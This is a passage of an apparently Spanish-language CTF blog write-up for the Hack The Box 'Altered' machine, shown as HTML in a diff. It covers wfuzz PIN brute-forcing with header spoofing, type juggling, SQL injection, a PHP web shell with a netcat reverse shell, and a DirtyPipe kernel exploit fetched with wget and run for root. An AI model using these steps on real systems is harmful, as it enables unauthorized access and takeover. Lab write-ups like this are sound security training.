+000001492:   200        140 L    324 W      5644 Ch     <span class="s2">"1491 - 10.10.5.221"</span>                           
+000001507:   200        140 L    324 W      5644 Ch     <span class="s2">"1506 - 10.10.5.236"</span>                           
+000001511:   200        140 L    324 W      5644 Ch     <span class="s2">"1510 - 10.10.5.240"</span>                           
+000001493:   200        140 L    324 W      5644 Ch     <span class="s2">"1492 - 10.10.5.222"</span>                           
+000001505:   200        140 L    324 W      5644 Ch     <span class="s2">"1504 - 10.10.5.234"</span>                           
+000001520:   200        140 L    324 W      5644 Ch     <span class="s2">"1519 - 10.10.5.249"</span>                           
+000001489:   200        140 L    324 W      5644 Ch     <span class="s2">"1488 - 10.10.5.218"</span>                           
+000001491:   200        140 L    324 W      5644 Ch     <span class="s2">"1490 - 10.10.5.220"</span>                           
+000001506:   200        140 L    324 W      5644 Ch     <span class="s2">"1505 - 10.10.5.235"</span>                           
+000001517:   200        140 L    324 W      5644 Ch     <span class="s2">"1516 - 10.10.5.246"</span>                           
+000001514:   200        140 L    324 W      5644 Ch     <span class="s2">"1513 - 10.10.5.243"</span>                           
+000001516:   200        140 L    324 W      5644 Ch     <span class="s2">"1515 - 10.10.5.245"</span>                           
+000001534:   200        140 L    324 W      5644 Ch     <span class="s2">"1533 - 10.10.6.9"</span>                             
+000001530:   200        140 L    324 W      5644 Ch     <span class="s2">"1529 - 10.10.6.5"</span>                             
+000001513:   200        140 L    324 W      5644 Ch     <span class="s2">"1512 - 10.10.5.242"</span>                           
+000001525:   200        140 L    324 W      5644 Ch     <span class="s2">"1524 - 10.10.6.0"</span>                             
+000001542:   200        140 L    324 W      5644 Ch     <span class="s2">"1541 - 10.10.6.17"</span>                            
+000001527:   200        140 L    324 W      5644 Ch     <span class="s2">"1526 - 10.10.6.2"</span>                             
+000001538:   200        140 L    324 W      5644 Ch     <span class="s2">"1537 - 10.10.6.13"</span>                            
+000001541:   200        140 L    324 W      5644 Ch     <span class="s2">"1540 - 10.10.6.16"</span>                            
+000001540:   200        140 L    324 W      5644 Ch     <span class="s2">"1539 - 10.10.6.15"</span>  
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno ahora es mas fácil solo ocultamos respuestas con esos caracteres y listo pero antes capturaremos otra vez la petición para cambiar la cookie y sea valida para la petición que estamos haciendo desde la web.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>5644 <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZkcFJRb0VjN3NnM0czZ3hXN2t2c3c9PSIsInZhbHVlIjoiVC93OVZvNlBGZXlYTWFJaEwrMmNRalY3cExsYUNBNnBOU01vU0dDankwR1JvVHExdk0xWERmUDVMZ1QvNWxYZVFmbVBEaTJNekVKTDdNUExIcFBuenNHSUkyT1B1b3YvTUxScldNbUM5VzNaWThWWC9oWXZPUzNFZmJyYTdzZU8iLCJtYWMiOiJhODViMmZmYTFkZGRkMGFkZTE4ZDFhNWE2NWY5ZTgwOWE0ZTBlMjhiNjAxZDQyOTFhOTE1ODk5NTYxMWY2Nzc2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.10.11.159/api/resettoken
+Total requests: 10000
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                        
+<span class="o">=====================================================================</span>
+
+000001052:   200        138 L    303 W      5366 Ch     <span class="s2">"1051 - 10.10.4.35"</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Tenemos un <code class="language-plaintext highlighter-rouge">PIN code</code> vamos a probarlo.</p>
+  </li>
+  <li>
+    <p>Y bueno funciona.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/7.png" />
+</p>
+
+<ul>
+  <li>Funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/8.png" />
+</p>
+
+<ul>
+  <li>Y bueno estamos dentro.</li>
+</ul>
+
+<h2 id="shell-as-www-data--type-juggling">Shell as www-data &amp;&amp; Type Juggling</h2>
+
+<ul>
+  <li>
+    <p>Vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> muchas peticiones a la hora de dar <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">view</code> en cada <code class="language-plaintext highlighter-rouge">profile</code> ya que no vemos nada interesante.</p>
+  </li>
+  <li>
+    <p>Vemos que son estáticas no cambian el <code class="language-plaintext highlighter-rouge">secret</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/9.png" />
+</p>
+
+<ul>
+  <li>Si cambiamos el <code class="language-plaintext highlighter-rouge">secret</code> añadiendo otro carácter nos detecta.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/10.png" />
+</p>
+
+<ul>
+  <li>Si cambiamos el <code class="language-plaintext highlighter-rouge">request method</code> obtenemos la siguiente respuesta.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/11.png" />
+</p>
+
+<ul>
+  <li>Si lo ponemos en <code class="language-plaintext highlighter-rouge">GET</code> manualmente obtenemos una data diferente por que si lo acepta.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/12.png" />
+</p>
+
+<ul>
+  <li>Vamos a cambiar la petición a un JSON.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/13.png" />
+</p>
+
+<ul>
+  <li>Si alteramos la data cambiando un valor o agregando otro nos da este error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/14.png" />
+</p>
+
+<ul>
+  <li>Lo mas probable es que por detrás se aplique una comparativa al valor del <code class="language-plaintext highlighter-rouge">secret</code> que tiene que ser exactamente ese para que funcione pero cuando se aplican comparativas usando <code class="language-plaintext highlighter-rouge">==</code> podemos poner un True y va a hacer correcto por eso mejor siempre usar un <code class="language-plaintext highlighter-rouge">===</code> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/15.png" />
+</p>
+
+<h2 id="sql-injection">SQL Injection</h2>
+
+<ul>
+  <li>Si añadimos una comilla en el campo <code class="language-plaintext highlighter-rouge">id</code> obtenemos un error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/16.png" />
+</p>
+
+<ul>
+  <li>Si probamos haciendo un ordenamiento para ver si es vulnerable a <code class="language-plaintext highlighter-rouge">SQLI</code> obtenemos lo mismo con o sin comilla.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/17.png" />
+</p>
+
+<ul>
+  <li>Sin embargo al llegar a 3 no obtenemos un error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/18.png" />
+</p>
+
+<ul>
+  <li>Si enviamos la petición no vemos los números para poder cambiar la <code class="language-plaintext highlighter-rouge">query</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/19.png" />
+</p>
+
+<ul>
+  <li>Si cambiamos el numero del id vemos que el campo que podemos escribir es en el 3.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/20.png" />
+</p>
+
+<ul>
+  <li>Sabemos el nombre de la base de datos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/21.png" />
+</p>
+
+<ul>
+  <li>Estas son todas las bases de datos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/22.png" />
+</p>
+
+<ul>
+  <li>Vamos a ver las tablas de la base de datos <code class="language-plaintext highlighter-rouge">uhc</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/23.png" />
+</p>
+
+<ul>
+  <li>Ahora las columnas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/24.png" />
+</p>
+
+<ul>
+  <li>Vemos los usuarios y sus hashes.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/25.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ninguna de las credenciales que obtendremos después de crackear los hashes nos funcionan para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
+  </li>
+  <li>
+    <p>Pero podemos leer archivos.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/26.png" />
+</p>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Podemos ver la flag.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/27.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Algo que podemos hacer es ver si tenemos capacidad de escritura sabemos que la web corre <code class="language-plaintext highlighter-rouge">Nginx</code> y <code class="language-plaintext highlighter-rouge">PHP</code> pero necesitamos saber la ruta donde guardaría algún archivo que escribamos.</p>
+  </li>
+  <li>
+    <p>Encontramos donde esta montada la web.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/28.png" />
+</p>
+
+<ul>
+  <li>Si comprobamos vemos que es correcto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/29.png" />
+</p>
+
+<ul>
+  <li>Podemos probar escribiendo <code class="language-plaintext highlighter-rouge">test</code> en un archivo.txt en la ruta que sabemos que existe.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/30.png" />
+</p>
+
+<ul>
+  <li>Pero si vamos a la web lo vemos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/31.png" />
+</p>
+
+<ul>
+  <li>Como interpreta PHP vamos a inyectar código PHP.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/32.png" />
+</p>
+
+<ul>
+  <li>Funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/33.png" />
+</p>
+
+<ul>
+  <li>Podemos ejecutar comandos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/34.png" />
+</p>
+
+<ul>
+  <li>Vamos a ponernos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/35.png" />
+</p>
+
+<ul>
+  <li>Recibimos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.159] 55000
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>931<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@altered:/srv/altered/public<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@altered:/srv/altered/public<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+www-data@altered:/srv/altered/public<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 443
+                                                                                                                
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
+                              reset xterm
+ENTER
+www-data@altered:/srv/altered/public<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>La versión de <code class="language-plaintext highlighter-rouge">kernel</code> es vulnerable <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux altered 5.16.0-051600-generic <span class="c">#202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
+www-data@altered:/<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 20.04.4 LTS
+Release:	20.04
+Codename:	focal
+www-data@altered:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Nos descargamos el exploit.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/refs/heads/main/exploit-1.c
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora compilamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gcc exploit-1.c <span class="nt">-o</span> exploit2 <span class="nt">-static</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Lo pasamos a la maquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>wget http://10.10.14.24/exploit2
+</code></pre></div></div>
+
+<ul>
+  <li>Lo ejecutamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>./exploit2 
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to <span class="s2">"piped"</span>...
+system<span class="o">()</span> <span class="k">function </span>call seems to have failed :<span class="o">(</span>
+www-data@altered:/dev/shm<span class="nv">$ </span>./exploit2 
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to <span class="s2">"piped"</span>...
+system<span class="o">()</span> <span class="k">function </span>call seems to have failed :<span class="o">(</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>su -
+<span class="nt">---</span> Welcome to PAM-Wordle! <span class="nt">---</span>
+
+A five character <span class="o">[</span>a-z] word has been selected.
+You have 6 attempts to guess the word.
+
+After each guess you will recieve a hint which indicates:
+? - what letters are wrong.
+<span class="k">*</span> - what letters are <span class="k">in </span>the wrong spot.
+<span class="o">[</span>a-z] - what letters are correct.
+
+<span class="nt">---</span> Attempt 1 of 6 <span class="nt">---</span>
+Word: <span class="nb">chmod
+</span>Hint-&gt;??<span class="k">*</span>??
+<span class="nt">---</span> Attempt 2 of 6 <span class="nt">---</span>
+Word: <span class="nb">mkdir
+</span>Hint-&gt;<span class="k">*</span>??<span class="k">*</span>?
+<span class="nt">---</span> Attempt 3 of 6 <span class="nt">---</span>
+Word: shell
+Hint-&gt;??<span class="k">*</span>??
+<span class="nt">---</span> Attempt 4 of 6 <span class="nt">---</span>
+Word: email
+Invalid guess: unknown word.
+Word: cmake
+Hint-&gt;?<span class="k">*</span>??e
+<span class="nt">---</span> Attempt 5 of 6 <span class="nt">---</span>
+Word: <span class="nb">uname
+</span>Hint-&gt;u??me
+<span class="nt">---</span> Attempt 6 of 6 <span class="nt">---</span>
+Word: utime
+Correct!
+Password:
+<span class="c"># whoami</span>
+root
+<span class="c"># cat /root/root.txt</span>
+507f83d162ba9b570e5397694741787d
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/hard/2024/10/20/altered.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
